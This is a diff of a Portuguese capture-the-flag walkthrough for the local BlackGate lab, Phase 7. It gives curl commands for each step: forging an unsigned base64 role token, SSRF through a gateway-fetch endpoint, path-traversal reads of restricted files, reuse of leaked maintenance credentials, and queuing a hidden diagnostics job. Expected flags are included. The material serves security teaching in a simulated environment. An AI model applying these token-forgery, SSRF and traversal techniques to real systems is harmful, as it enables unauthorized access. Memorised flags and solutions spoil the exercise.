@@ -1,8 +1,8 @@
-# Lab 05 - BlackGate - Walkthrough da Fase 6
+# Lab 05 - BlackGate - Walkthrough da Fase 7
 
-Este walkthrough cobre a **Fase 6 — Credential Reuse / Legacy Panel Labyrinth** do Lab 05. A aplicação mantém as fases anteriores e adiciona um painel legado simulado com credenciais de manutenção, decoys e realm separado.
+Este walkthrough cobre a **Fase 7 - Report Workflow Abuse / Queue Preparation** do Lab 05. A aplicacao mantem as fases anteriores e adiciona um workflow legado de reports dentro de `legacy-panel.internal`.
 
-Tudo continua seguro e local: não há request real para internet, banco externo, shell, upload, Redis, worker ou command injection.
+Tudo continua seguro e local: nao ha request real para internet, banco externo, shell, upload, Redis, worker real ou command injection.
 
 ## Como subir
 
@@ -17,12 +17,11 @@ Acesse:
 http://localhost:8096
 ```
 
-## Saúde e versão
+## Saude e versao
 
-Abra:
-
-```text
-http://localhost:8096/health
+```bash
+curl -i http://localhost:8096/health
+curl -i http://localhost:8096/api/version
 ```
 
 Resultado esperado:
@@ -31,311 +30,399 @@ Resultado esperado:
 {
   "service": "blackgate",
   "status": "ok",
-  "version": "1.5.0-phase6"
+  "version": "1.6.0-phase7"
 }
 ```
 
-`/api/version` deve retornar build `bg-phase6-legacy-reuse`.
+`/api/version` deve retornar build `bg-phase7-report-workflow`.
 
-## Login
-
-Faça login com:
-
-```text
-guest / guest123
-```
-
-Confirme o dashboard, a role `guest`, e os menus `/context`, `/gateway`, `/legacy` e `/files-vault`.
-
-## Recon acumulado
-
-Confira:
-
-```text
-/api/client-config
-/api/routes
-/debug/ping
-```
-
-Com:
-
-```text
-X-Debug-Token: guest-debug
-```
-
-Observe:
-
-- `X-BG-Context`;
-- gateway operator-mediated;
-- Files Vault gateway-only;
-- legacy em modo migration;
-- realm separado;
-- debug com informação propositalmente escassa sobre o painel legado.
-
-## Gerar contexto operator
-
-Use o mesmo abuso da Fase 3:
+## Login e contexto operator
 
 ```bash
+rm -f /tmp/bg-cookie.txt
+
+curl -i -c /tmp/bg-cookie.txt \
+  -d "username=guest&password=guest123" \
+  -X POST http://localhost:8096/login
+
 TOKEN=$(node -e 'const p={user:"guest",role:"operator",scope:"operations",issued_by:"legacy-context-service"}; console.log(Buffer.from(JSON.stringify(p)).toString("base64url"))')
 echo "$TOKEN"
 ```
 
-Valide com:
+## Fases anteriores preservadas
 
-```text
-POST /api/context/verify
-Header: X-BG-Context: <TOKEN>
+Fase 3:
+
+```bash
+curl -i -b /tmp/bg-cookie.txt \
+  -H "X-BG-Context: $TOKEN" \
+  http://localhost:8096/api/operator/briefing
 ```
 
-## Fase 3 preservada
-
-```text
-GET /api/operator/briefing
-Header: X-BG-Context: <TOKEN>
-```
-
-Resultado:
+Flag esperada:
 
 ```text
 FLAG{blackgate_weak_token_role_escalation_phase3}
 ```
 
-## Fase 4 preservada
+Fase 4:
 
-```text
-/api/operator/gateway-fetch?url=http://api-core.internal/metadata
+```bash
+CORE_META=$(node -e 'console.log(encodeURIComponent("http://api-core.internal/metadata"))')
+
+curl -i -b /tmp/bg-cookie.txt \
+  -H "X-BG-Context: $TOKEN" \
+  "http://localhost:8096/api/operator/gateway-fetch?url=$CORE_META"
 ```
 
-Resultado:
+Flag esperada:
 
 ```text
 FLAG{blackgate_gateway_trust_ssrf_phase4}
 ```
 
-## Fase 5 preservada
+Fase 5:
 
-```text
-/api/operator/gateway-fetch?url=http://files-vault.internal/read?path=/public/../restricted/phase5-seed.txt
+```bash
+PHASE5_FILE=$(node -e 'console.log(encodeURIComponent("http://files-vault.internal/read?path=/public/../restricted/phase5-seed.txt"))')
+
+curl -i -b /tmp/bg-cookie.txt \
+  -H "X-BG-Context: $TOKEN" \
+  "http://localhost:8096/api/operator/gateway-fetch?url=$PHASE5_FILE"
 ```
 
-Resultado:
+Flag esperada:
 
 ```text
 FLAG{blackgate_files_vault_controlled_read_phase5}
 ```
 
-## Arquivos restritos de migração
+## Repetir a cadeia ate a legacy_session
 
-Use o mesmo bypass controlado do Files Vault para ler arquivos restritos. Eles não aparecem no catálogo público.
+Leia os arquivos restritos usados na Fase 6 para encontrar a credencial de manutencao:
 
-Leia:
+```bash
+CREDS_FILE=$(node -e 'console.log(encodeURIComponent("http://files-vault.internal/read?path=/public/../restricted/legacy-panel-creds.txt"))')
 
-```text
-/api/operator/gateway-fetch?url=http://files-vault.internal/read?path=/public/../restricted/legacy-migration-notes.txt
+curl -i -b /tmp/bg-cookie.txt \
+  -H "X-BG-Context: $TOKEN" \
+  "http://localhost:8096/api/operator/gateway-fetch?url=$CREDS_FILE"
 ```
 
-Pontos importantes:
-
-- o login público e o painel legado não compartilham identity provider;
-- algumas contas foram espelhadas apenas para checks de manutenção via gateway;
-- o primeiro bloco de credenciais arquivadas não deve ser confiável.
-
-Leia:
-
-```text
-/api/operator/gateway-fetch?url=http://files-vault.internal/read?path=/public/../restricted/operator-archive-2026.txt
-```
-
-Decoys vistos:
-
-```text
-operator / operator123
-admin / admin
-bg_admin / blackgate
-svc_audit / audit2026
-```
-
-Leia:
-
-```text
-/api/operator/gateway-fetch?url=http://files-vault.internal/read?path=/public/../restricted/credential-review.txt
-```
-
-Conclusões:
-
-- `operator / operator123` é válido só no console público;
-- `svc_audit` foi desativado;
-- `bg_admin` é placeholder;
-- contas de migração usam legacy realm;
-- o formato esperado é `svc_migration`, não e-mail.
-
-Leia o arquivo de credenciais:
-
-```text
-/api/operator/gateway-fetch?url=http://files-vault.internal/read?path=/public/../restricted/legacy-panel-creds.txt
-```
-
-Credencial útil:
+Credencial util:
 
 ```text
 svc_migration / migrate-yellow-gate
 ```
 
-Credenciais decoy:
+Autentique no legacy realm:
 
-```text
-operator / operator123
-admin / admin
-bg_admin / blackgate
-svc_audit / audit2026
-svc_backup / backup2026
+```bash
+LEGACY_AUTH=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/auth?user=svc_migration&pass=migrate-yellow-gate"))')
+
+curl -i -b /tmp/bg-cookie.txt \
+  -H "X-BG-Context: $TOKEN" \
+  "http://localhost:8096/api/operator/gateway-fetch?url=$LEGACY_AUTH"
 ```
-
-## Enumerar legacy-panel.internal
-
-Consulte metadata:
-
-```text
-/api/operator/gateway-fetch?url=http://legacy-panel.internal/metadata
-```
-
-Observe:
-
-- `auth: legacy-realm`;
-- `public_idp: false`;
-- `gateway_required: true`;
-- notas sobre credenciais arquivadas e stale entries.
-
-Consulte status:
-
-```text
-/api/operator/gateway-fetch?url=http://legacy-panel.internal/status
-```
-
-Observe:
-
-- `/login` está desabilitado;
-- `/auth` e `/maintenance` continuam habilitados;
-- interactive login não é o caminho correto.
-
-Teste o decoy:
-
-```text
-/api/operator/gateway-fetch?url=http://legacy-panel.internal/login
-```
-
-Resultado:
-
-```json
-{
-  "error": "interactive_login_disabled",
-  "message": "Legacy interactive login is disabled during migration."
-}
-```
-
-## Autenticar no legacy realm
-
-Como o gateway-fetch recebe a URL interna dentro de uma query string, encode a URL quando houver parâmetros.
-
-URL interna:
-
-```text
-http://legacy-panel.internal/auth?user=svc_migration&pass=migrate-yellow-gate
-```
-
-Após encode, envie pelo gateway-fetch.
 
 Resultado esperado:
 
-```json
-{
-  "authenticated": true,
-  "realm": "maintenance",
-  "principal": "svc_migration",
-  "legacy_session": "bg6-legacy-session-migration",
-  "next": "/maintenance"
-}
-```
-
-Teste importante: se usar `operator / operator123`, o retorno deve ser `wrong_realm`, porque credenciais públicas não valem no realm de manutenção.
-
-## Acessar maintenance
-
-Use a sessão retornada:
-
 ```text
-http://legacy-panel.internal/maintenance?session=bg6-legacy-session-migration
+bg6-legacy-session-migration
 ```
 
-Envie essa URL codificada pelo gateway-fetch.
+Acesse maintenance:
 
-Resultado:
+```bash
+LEGACY_MAINT=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/maintenance?session=bg6-legacy-session-migration"))')
+
+curl -i -b /tmp/bg-cookie.txt \
+  -H "X-BG-Context: $TOKEN" \
+  "http://localhost:8096/api/operator/gateway-fetch?url=$LEGACY_MAINT"
+```
+
+Flag esperada da Fase 6:
 
 ```text
 FLAG{blackgate_legacy_credential_reuse_phase6}
 ```
 
-Resposta completa esperada:
+A pista nova e:
+
+```text
+Maintenance reports queue jobs for asynchronous processing.
+```
+
+## Acessar reports
+
+Sem sessao:
+
+```bash
+REPORTS_NO_SESSION=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/reports"))')
+
+curl -i -b /tmp/bg-cookie.txt \
+  -H "X-BG-Context: $TOKEN" \
+  "http://localhost:8096/api/operator/gateway-fetch?url=$REPORTS_NO_SESSION"
+```
+
+Resultado esperado: `legacy_session_required`.
+
+Com sessao:
+
+```bash
+REPORTS=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/reports?session=bg6-legacy-session-migration"))')
+
+curl -i -b /tmp/bg-cookie.txt \
+  -H "X-BG-Context: $TOKEN" \
+  "http://localhost:8096/api/operator/gateway-fetch?url=$REPORTS"
+```
+
+Resultado esperado:
 
 ```json
 {
   "service": "legacy-panel",
-  "area": "maintenance",
-  "principal": "svc_migration",
-  "finding": "credential reuse across migration boundary",
-  "flag": "FLAG{blackgate_legacy_credential_reuse_phase6}",
-  "next_hint": "Maintenance reports queue jobs for asynchronous processing in the next phase."
+  "module": "reports",
+  "status": "partial",
+  "available_actions": ["templates", "preview", "create"],
+  "queue": "migration-report-queue"
 }
 ```
 
-## Bloqueios esperados
+## Enumerar templates
 
-Sem credenciais:
+Selector padrao:
+
+```bash
+TEMPLATES=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/reports/templates?session=bg6-legacy-session-migration"))')
+
+curl -i -b /tmp/bg-cookie.txt \
+  -H "X-BG-Context: $TOKEN" \
+  "http://localhost:8096/api/operator/gateway-fetch?url=$TEMPLATES"
+```
+
+Mostra apenas templates enabled.
+
+Archive parcial:
+
+```bash
+TEMPLATES_ARCHIVED=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/reports/templates?session=bg6-legacy-session-migration&include=archived"))')
+
+curl -i -b /tmp/bg-cookie.txt \
+  -H "X-BG-Context: $TOKEN" \
+  "http://localhost:8096/api/operator/gateway-fetch?url=$TEMPLATES_ARCHIVED"
+```
+
+Archive completo com audit:
+
+```bash
+TEMPLATES_ALL=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/reports/templates?session=bg6-legacy-session-migration&include=all&audit=1"))')
+
+curl -i -b /tmp/bg-cookie.txt \
+  -H "X-BG-Context: $TOKEN" \
+  "http://localhost:8096/api/operator/gateway-fetch?url=$TEMPLATES_ALL"
+```
+
+Aqui aparece `worker-diagnostics` como entrada hidden/maintenance.
+
+## Ler notas internas de reports
+
+Use o mesmo bypass controlado da Fase 5:
+
+```bash
+REPORT_NOTES=$(node -e 'console.log(encodeURIComponent("http://files-vault.internal/read?path=/public/../restricted/report-workflow-notes.txt"))')
+QUEUE_REVIEW=$(node -e 'console.log(encodeURIComponent("http://files-vault.internal/read?path=/public/../restricted/queue-review.txt"))')
+TEMPLATE_ARCHIVE=$(node -e 'console.log(encodeURIComponent("http://files-vault.internal/read?path=/public/../restricted/template-archive.txt"))')
+
+curl -i -b /tmp/bg-cookie.txt \
+  -H "X-BG-Context: $TOKEN" \
+  "http://localhost:8096/api/operator/gateway-fetch?url=$REPORT_NOTES"
+
+curl -i -b /tmp/bg-cookie.txt \
+  -H "X-BG-Context: $TOKEN" \
+  "http://localhost:8096/api/operator/gateway-fetch?url=$QUEUE_REVIEW"
+
+curl -i -b /tmp/bg-cookie.txt \
+  -H "X-BG-Context: $TOKEN" \
+  "http://localhost:8096/api/operator/gateway-fetch?url=$TEMPLATE_ARCHIVE"
+```
+
+Pontos importantes:
+
+- `queue-only` foi adicionado para validacao de manutencao;
+- `worker-diagnostics` nao aparece no seletor publico;
+- `internal` permanece restrito;
+- a fila de manutencao e `maintenance-worker`.
+
+## Testar previews e decoys
+
+Preview normal:
+
+```bash
+PREVIEW_OK=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/reports/preview?session=bg6-legacy-session-migration&template=migration-check&format=json&scope=summary"))')
+
+curl -i -b /tmp/bg-cookie.txt \
+  -H "X-BG-Context: $TOKEN" \
+  "http://localhost:8096/api/operator/gateway-fetch?url=$PREVIEW_OK"
+```
+
+PDF:
+
+```bash
+PREVIEW_PDF=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/reports/preview?session=bg6-legacy-session-migration&template=migration-check&format=pdf&scope=summary"))')
+
+curl -i -b /tmp/bg-cookie.txt \
+  -H "X-BG-Context: $TOKEN" \
+  "http://localhost:8096/api/operator/gateway-fetch?url=$PREVIEW_PDF"
+```
+
+Resultado esperado: `unsupported_format`.
+
+Worker diagnostics:
+
+```bash
+PREVIEW_WORKER=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/reports/preview?session=bg6-legacy-session-migration&template=worker-diagnostics&format=json&scope=summary"))')
+
+curl -i -b /tmp/bg-cookie.txt \
+  -H "X-BG-Context: $TOKEN" \
+  "http://localhost:8096/api/operator/gateway-fetch?url=$PREVIEW_WORKER"
+```
+
+Resultado esperado:
+
+```text
+Template requires queue validation before rendering.
+```
+
+## Criar jobs decoy
+
+Job normal sem flag:
+
+```bash
+CREATE_NORMAL=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/reports/create?session=bg6-legacy-session-migration&template=migration-check&format=json&scope=summary&queue=migration-report-queue&mode=dry-run"))')
+
+curl -i -b /tmp/bg-cookie.txt \
+  -H "X-BG-Context: $TOKEN" \
+  "http://localhost:8096/api/operator/gateway-fetch?url=$CREATE_NORMAL"
+```
+
+Worker diagnostics com queue errada:
+
+```bash
+CREATE_WRONG_QUEUE=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/reports/create?session=bg6-legacy-session-migration&template=worker-diagnostics&format=json&scope=internal&queue=migration-report-queue&mode=queue-only"))')
+
+curl -i -b /tmp/bg-cookie.txt \
+  -H "X-BG-Context: $TOKEN" \
+  "http://localhost:8096/api/operator/gateway-fetch?url=$CREATE_WRONG_QUEUE"
+```
+
+Resultado esperado: job aceito na fila errada, sem flag.
+
+Worker diagnostics com render sincrono:
+
+```bash
+CREATE_RENDER=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/reports/create?session=bg6-legacy-session-migration&template=worker-diagnostics&format=json&scope=internal&queue=maintenance-worker&mode=render"))')
+
+curl -i -b /tmp/bg-cookie.txt \
+  -H "X-BG-Context: $TOKEN" \
+  "http://localhost:8096/api/operator/gateway-fetch?url=$CREATE_RENDER"
+```
+
+Resultado esperado: `synchronous_render_disabled`.
+
+## Criar o job correto da Fase 7
+
+Combinacao:
+
+```text
+template=worker-diagnostics
+format=json
+scope=internal
+queue=maintenance-worker
+mode=queue-only
+```
+
+Comando:
+
+```bash
+CREATE_JOB=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/reports/create?session=bg6-legacy-session-migration&template=worker-diagnostics&format=json&scope=internal&queue=maintenance-worker&mode=queue-only"))')
+
+curl -i -b /tmp/bg-cookie.txt \
+  -H "X-BG-Context: $TOKEN" \
+  "http://localhost:8096/api/operator/gateway-fetch?url=$CREATE_JOB"
+```
+
+Resposta esperada:
 
 ```json
 {
-  "error": "missing_credentials",
-  "message": "Maintenance realm credentials are required."
+  "service": "legacy-panel",
+  "module": "reports",
+  "created": true,
+  "job_id": "bg7-job-worker-diagnostics",
+  "queue": "maintenance-worker",
+  "status": "queued",
+  "risk": "unsafe-template-accepted",
+  "finding": "report workflow accepted an internal worker diagnostics job",
+  "flag": "FLAG{blackgate_report_workflow_abuse_phase7}",
+  "next_hint": "Queued diagnostics jobs are processed by a maintenance worker in the next phase."
 }
 ```
 
-Credencial pública no painel legado:
+## Ver fila, jobs e worker
 
-```json
-{
-  "error": "wrong_realm",
-  "message": "Public console credentials are not valid in the maintenance realm."
-}
+Listar jobs:
+
+```bash
+JOBS=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/reports/jobs?session=bg6-legacy-session-migration"))')
+
+curl -i -b /tmp/bg-cookie.txt \
+  -H "X-BG-Context: $TOKEN" \
+  "http://localhost:8096/api/operator/gateway-fetch?url=$JOBS"
 ```
 
-Credencial falsa:
+Detalhe do job:
 
-```json
-{
-  "error": "invalid_legacy_credentials",
-  "message": "Legacy realm authentication failed."
-}
+```bash
+JOB_DETAIL=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/reports/jobs/bg7-job-worker-diagnostics?session=bg6-legacy-session-migration"))')
+
+curl -i -b /tmp/bg-cookie.txt \
+  -H "X-BG-Context: $TOKEN" \
+  "http://localhost:8096/api/operator/gateway-fetch?url=$JOB_DETAIL"
 ```
 
-Maintenance sem sessão:
+Fila:
 
-```json
-{
-  "error": "legacy_session_required",
-  "message": "Authenticated maintenance session required."
-}
+```bash
+QUEUE=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/reports/queue?session=bg6-legacy-session-migration"))')
+
+curl -i -b /tmp/bg-cookie.txt \
+  -H "X-BG-Context: $TOKEN" \
+  "http://localhost:8096/api/operator/gateway-fetch?url=$QUEUE"
 ```
 
-## Flags confirmadas até esta fase
+Worker status:
+
+```bash
+WORKER_STATUS=$(node -e 'console.log(encodeURIComponent("http://legacy-panel.internal/reports/worker-status?session=bg6-legacy-session-migration"))')
+
+curl -i -b /tmp/bg-cookie.txt \
+  -H "X-BG-Context: $TOKEN" \
+  "http://localhost:8096/api/operator/gateway-fetch?url=$WORKER_STATUS"
+```
+
+O worker deve estar `paused`; nao ha execucao de comandos nem processamento real nesta fase.
+
+## Flags confirmadas ate esta fase
 
 ```text
 FLAG{blackgate_weak_token_role_escalation_phase3}
 FLAG{blackgate_gateway_trust_ssrf_phase4}
 FLAG{blackgate_files_vault_controlled_read_phase5}
 FLAG{blackgate_legacy_credential_reuse_phase6}
+FLAG{blackgate_report_workflow_abuse_phase7}
 ```
 
-## O que fica para a próxima fase
+## O que fica para a proxima fase
 
-A Fase 6 não implementa report generator explorável, fila, worker, Redis ou command injection. A pista final indica que reports de manutenção entram em fila de processamento, preparando a Fase 7.
+A Fase 8 deve usar o job criado na Fase 7 para simular processamento perigoso pelo maintenance worker. Isso ainda nao existe nesta fase.
